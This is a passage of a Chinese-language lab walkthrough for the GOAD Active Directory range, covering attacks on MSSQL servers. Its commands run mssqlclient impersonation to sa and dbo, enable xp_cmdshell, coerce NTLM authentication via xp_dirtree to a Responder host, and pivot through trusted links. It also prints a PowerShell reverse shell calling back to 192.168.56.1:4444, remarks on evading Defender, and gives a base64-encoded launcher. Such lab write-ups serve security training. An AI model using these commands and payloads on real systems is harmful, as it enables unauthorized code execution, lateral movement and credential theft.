    cme mssql 192.168.56.22-23 探测 
    cme mssql 192.168.56.22 -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 登录验证
### fscan/nacs
这里也用nacs试试
这里探测成功了 但是登录失败 是因为这个用户是windows用户而不是mssql用户
### Impacket
像0x05里一样
    git clone https://github.com/SecureAuthCorp/impacket myimpacketmssql
    cd myimpacket
    git fetch origin pull/1397/head:1397
    git merge 1397
    conda create -n myimpacketmssql python=3.7.9
    conda activate myimpacketmssql
    pip install .
    mssqlclient.py -windows-auth north.sevenkingdoms.local/samwell.tarly:PI:EMAIL
    enum_logins
    实际命令如下：
    select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, 
    sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin 
    from  master.sys.server_principals r 
    left join master.sys.syslogins sl on sl.sid = r.sid 
    where r.type in ('S','E','X','U','G')
### impersonate - execute as login
    enum_impersonate
这实际上运行了如下命令，列出所有具有impersonation权限的login
    SELECT 'LOGIN' as 'execute as','' AS 'database', 
    pe.permission_name, pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' 
    FROM sys.server_permissions pe 
    JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_Id 
    JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
这还在每个数据库上执行以下命令，列出所有具有impersonation权限的用户
    use ;
    SELECT 'USER' as 'execute as', DB_NAME() AS 'database',
    pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' 
    FROM sys.database_permissions pe 
    JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_Id 
    JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
>   * A “Login” grants the principal entry into the **SERVER  
>  -** A “User” grants a login entry into a single **DATABASE**
>
“SQL Login用于身份验证，SQL Server User 用于授权。
身份验证可以决定我们是否有权访问服务器，授权决定我们可以在数据库中执行哪些不同的操作。 Login是在 SQL Server 实例级别创建的，User是在
SQL Server 数据库级别创建的。 我们可以让来自不同数据库的多个用户连接到服务器的单个登录。”
可见samwell可以冒充sa用户
然后我们使用`execute as login`来冒充用户然后使用`xp_cmdshell`来执行命令
    exec_as_login sa
    enable_xp_cmdshell
    xp_cmdshell whoami
这实际上执行了如下命令
    execute as login='sa';
    exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;
    exec master..xp_cmdshell 'whoami'
以sa身份重新执行枚举
    enum_logins
我们看到了更多的东西。 我们可以看到 jon.snow 是 mssql 服务器上的 sysadmin
看看有没有其他人具有impersonation权限：
  * 作为 sysadmin 用户 (sa)，我们可以看到数据库中的所有信息以及其他具有impersonation权限的用户。
  * 另一种方式可以是以 brandon.stark 身份访问并以登录用户 jon.snow 身份执行。
### impersonate - execute as user
  * 我们使用arya.stark用户登录到db
    mssqlclient.py -windows-auth north.sevenkingdoms.local/arya.stark:PI:EMAIL
    enum_impersonate
如果我们切换到master用户然后冒充dbo用户来获取shell
    use master # 默认就在master 可以省略
    exec_as_user dbo
    xp_cmdshell whoami
    实际执行的命令是
    use master
    execute as user = "dbo"
    exec master..xp_cmdshell 'whoami'
失败了
但是换到msdb数据库就行了
两个数据库之间的区别在于 msdb 获得了可信属性集（msdb 上的默认值）。
## Coerce and relay
  * Mssql 也可用于强制从 mssql 服务器进行 NTLM 身份验证。 传入的连接将来自运行 mssql 服务器的用户。
  * 在我们的例子中，如果我们告诉任何像 hodor 这样的用户，我们可以获得 NTLM 身份验证
  * 启动responder
    sudo responder -I vboxnet0
  * 使用hodor来连接
    mssqlclient.py -windows-auth north.sevenkingdoms.local/hodor:PI:EMAIL
  * 执行xp_dirtree命令
    exec master.sys.xp_dirtree '\\192.168.56.1\demontlm',1,1
  * 收到了连接
这个hash也可以使用hashcat来破解？
  * 这也适用于 ntlmrelayx（就像以管理员身份运行的服务器和在其他服务器上使用相同密码一样）。 但是在该靶场中，目前还没有设置这种行为。
### trusted links
  * 我们可以尝试的另一种 SQL 攻击是使用 mssql 可信链接。
> 请注意，可信链接也是一种森林到森林技术
>
>   * 要攻击链接，让我们连接 jon.snow 并使用 enum_links
>
    mssqlclient.py -windows-auth north.sevenkingdoms.local/jon.snow:PI:EMAIL -show
    SQL (NORTH\jon.snow  dbo@master)> enum_links
    实际上执行了如下命令
    EXEC sp_linkedservers
    EXEC sp_helplinkedsrvlogin
  * 正如我们所看到的，存在一个名为 BRAAVOS 的链接服务器，并且在 braavos 上存在用户 jon.snow 和 sa 的映射。
  * 如果我们使用链接，我们可以在 braavos 上获得命令注入：
    use_link BRAAVOS
    enable_xp_cmdshell
    xp_cmdshell whoami
    EXEC ('select system_user as "username"') AT BRAAVOS
    EXEC ('exec master.dbo.sp_configure ''show advanced options'',1;RECONFIGURE;exec master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE;') AT BRAAVOS
    EXEC ('exec master..xp_cmdshell ''whoami''') AT BRAAVOS
  * 我们在 braavos.essos.local 作为 essos\sql_svc 获得了一个命令注入
  * 我(作者)已经对 mssqlclient.py 进行了修改，以便能够链接 trusted_links。 从这里我们可以继续到另一个可信链接，等等……
  * 例如
## Command execution to shell
  * 我们在castelblack和braavos都可以执行命令了，现在想获得一个交互式的shell
  * 要获得一个 shell，我们可以使用一个基本的 Powershell webshell（在 arsenal commands cheatsheet 项目上有一个可用的。这是我的另一个项目，我需要在有时间的时候改进它，但是这个脚本不再绕过 defender， 所以让我们写一些修改）：
    $c = New-Object System.Net.Sockets.TCPClient('192.168.56.1',4444);
    $s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
        $sb = (iex $d 2>&1 | Out-String );
        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
        $s.Write($sb,0,$sb.Length);
        $s.Flush()
    };
    $c.Close()
让我们将此 powershell 命令转换为 utf-16 中的 base64 for powershell
    #!/usr/bin/env python
    import base64
    import sys
    if len(sys.argv) &1 | Out-String );
        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
        $s.Write($sb,0,$sb.Length);
        $s.Flush()
    };
    $c.Close()
    """ % (sys.argv[1], sys.argv[2])
    byte = payload.encode('utf-16-le')
    b64 = base64.b64encode(byte)
    print("powershell -exec bypass -enc %s" % b64.decode())
    powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgA1ADYALgAxACcALAA0ADQANAA0ACkAOwAKACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABpAGUAeAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAgACsAIAAnAHAAcwA+ACAAJwApADsACgAgACAAIAAgACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIAAkAHMALgBGAGwAdQBzAGgAKAApAAoAfQA7AAoAJABjAC4AQwBsAG8AcwBlACgAKQAKAA==
这里也可以上线到cs或者我们试一下hoaxshell
## Other tools to use
  * There is some interresting projects to exploit mssql, here is some of them :
    * 
    * 
    * 
  * Interresting informations :
    * 
    * 
    * 
    * 
    * 